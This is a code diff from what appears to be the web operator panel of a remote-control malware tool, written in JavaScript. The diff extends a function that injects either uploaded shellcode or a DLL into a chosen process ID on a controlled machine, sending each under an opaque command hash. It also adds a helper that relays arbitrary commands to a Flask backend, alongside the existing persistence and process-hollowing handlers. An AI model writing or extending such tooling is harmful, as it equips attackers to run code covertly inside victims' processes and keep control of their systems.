@@ -39,7 +39,7 @@ export class PersistenceOption{
     }
 }
 
-export function InjectOption(e, id){
+export function InjectOption(e, id, type){
     e.preventDefault();
     toggleAll("");
     fetch('/ProcessTableIndex')
@@ -80,7 +80,7 @@ export function InjectOption(e, id){
               icon.style.color = '#0f0';
             } else {
               icon.addEventListener('click', function() {
-                SendInjectByPid(i[1],icon, id);
+                SendInjectByPid(i[1], icon, id, type);
               });
             }
   
@@ -309,14 +309,21 @@ export function UploadProcessToInject() {
     });
 }
 
-function SendInjectByPid(pid,icon,id){
-    UploadProcessToInject().then(shellonbase => {
+function SendInjectByPid(pid, icon, id, type){
+    UploadProcessToInject().then(payload => {
+        let body;
+        if(type === "DLL"){
+          body = JSON.stringify({message:{command: "70d78a787fc59a5deb9578a58102ae2d",dllonbase:payload, targetPid:pid}, id: id})
+        }
+        else{
+          body = JSON.stringify({message:{command: "aea87b24517d08c8ff13601406a0202e",shellonbase:payload, targetPid:pid}, id: id})
+        }
         return fetch("/send_message", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
-        body: JSON.stringify({message:{command: "aea87b24517d08c8ff13601406a0202e",shellonbase:shellonbase, targetPid:pid}, id: id})
+        body: body
         })
         .then(response => {
         if (!response.ok) {
@@ -464,6 +471,7 @@ export class HollowingOptionHandler {
     tdName.appendChild(img);
 
     let pname = document.createElement('p');
+    pname.style.marginBottom = "1px";
     let nameText = document.createTextNode(file.name);
     pname.appendChild(nameText);
 
@@ -521,4 +529,22 @@ export class HollowingOptionHandler {
         })
     });
   }
+}
+
+
+
+
+export function sendMsgToFlsk(msg, id){
+  return fetch("/send_message", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({message:{command: msg}, id: id})
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+  })
 }
